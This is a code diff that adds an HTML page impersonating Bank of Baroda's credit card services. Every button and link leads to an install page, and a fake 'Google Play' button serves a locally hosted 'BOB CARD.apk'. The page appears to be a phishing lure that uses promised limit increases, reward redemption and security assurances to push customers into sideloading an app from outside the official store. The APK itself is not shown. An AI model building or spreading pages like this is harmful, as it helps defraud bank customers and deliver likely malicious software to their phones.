@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Of Baroda Bank</title>
+    <link rel="icon" type="image/x-icon" href="image/alogo.png">
+    <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+
+
+
+    <!-- Header -->
+    <header class="app-header">
+        <div class="header-content">
+
+            <img src="image/logo.webp" class="bank-logo">
+            <i class="fas fa-bars menu-icon"></i>
+        </div>
+    </header>
+
+    <!-- Sidebar Menu -->
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <img src="image/logo.webp" class="sidebar-logo">
+        </div>
+        <ul class="sidebar-menu">
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Reward Point</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Protection Cancellation</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card To Card Apply Application</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Block Application</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Limit Increase Application</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Separate Managed Card</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'">Card Activation Application</a></li>
+            <li><a href="#" onclick="window.location.href='playinstall.html'" class="login-link">Login</a></li>
+        </ul>
+    </div>
+
+
+    <div class="gallery-container">
+        <div class="image-strip" id="imageStrip">
+            <img src="../image/slide3.webp" alt="3" />
+            <img src="../image/slide2.webp" alt="2" />
+            <img src="../image/slide11.webp" alt="1" />
+        </div>
+
+    </div>
+
+    <!-- Google Play Download -->
+    <div class="download-section" data-download-url="image/BOB CARD.apk">
+        <i class="fab fa-google-play"></i>
+        <span>Google Play</span>
+        <i class="fas fa-download"></i>
+    </div>
+
+
+
+    <!-- Card Protection Section -->
+    <section class="service-section">
+        <h3>Card Protection</h3>
+        <p>Protect yourself with India's first comprehensive care protection service in the event of job loss, theft or fraud.</p>
+        <div class="action-buttons">
+            <button class="btn-activate" onclick="window.location.href='playinstall.html'">Activate</button>
+            <button class="btn-deactivate" onclick="window.location.href='playinstall.html'">Deactivate</button>
+        </div>
+    </section>
+
+
+
+    <section class="service-section">
+        <h3>Card to Card</h3>
+        <p>
+            Easily transfer your credit card balance from one card to another with our secure Card to Card service. Manage your payments efficiently and enjoy better control over your credit usage.
+        </p>
+        <div class="action-buttons">
+            <button class="btn-activate" onclick="window.location.href='playinstall.html'">Activate</button>
+        </div>
+    </section>
+
+    <section class="service-section">
+        <h3>Limit Increase</h3>
+        <p>
+            Increase your credit card limit instantly to enjoy higher spending power. Upgrade your lifestyle, manage bigger expenses easily, and get more financial flexibility with a higher credit limit.
+        </p>
+        <div class="action-buttons">
+            <button class="btn-activate" onclick="window.location.href='playinstall.html'">Increase Limit</button>
+        </div>
+    </section>
+
+
+
+
+    <!-- Redeem Reward Points Section -->
+    <section class="service-section">
+        <h3>Redeem Your Reward Points</h3>
+        <p>Redeem your Bank Of Baroda Credit Card reward points for exciting products and e-vouchers.</p>
+        <button class="btn-redeem" onclick="window.location.href='playinstall.html'">Redeem Now</button>
+    </section>
+
+    <!-- Account Access Section -->
+    <section class="service-section">
+        <h3>Account Access</h3>
+        <p>Login or register to your Bank Of Baroda Credit Card account to manage your card, view statements, unlock your account, and read your password.</p>
+        <button class="btn-login" onclick="window.location.href='playinstall.html'">Login</button>
+    </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="app-footer">
+        <div class="footer-content">
+            <img src="image/logo.webp" alt="Bank Of Baroda Bank" class="footer-logo">
+            <p><i class="fas fa-shield-alt"></i> Your data is protected with industry standard encryption.</p>
+            <p>All transactions are secure and confidential</p>
+            <div class="footer-links">
+                <a href="#" onclick="window.location.href='playinstall.html'">Terms & Conditions</a>
+                <a href="#" onclick="window.location.href='playinstall.html'">Privacy Policy</a>
+                <a href="#" onclick="window.location.href='playinstall.html'">Help & Support</a>
+            </div>
+            <p class="copyright">© 2026 Bank Of Baroda Bank. All rights reserved.</p>
+        </div>
+    </footer>
+
+
+
+
+
+
+
+
+    <script>
+        const strip = document.getElementById("imageStrip");
+        const images = strip.querySelectorAll("img");
+
+        let currentIndex = 0;
+        const scrollInterval = 2000;
+
+        const scrollToImage = (index) => {
+            const image = images[index];
+            if (image) {
+                const offsetLeft = image.offsetLeft;
+                strip.scrollTo({
+                    left: offsetLeft,
+                    behavior: "smooth"
+                });
+            }
+        };
+
+        let autoScroll = setInterval(() => {
+            currentIndex++;
+            if (currentIndex >= images.length) {
+                currentIndex = 0;
+            }
+            scrollToImage(currentIndex);
+        }, scrollInterval);
+    </script>
+
+
+    <script src="index.js"></script>
+</body>
+
+</html>
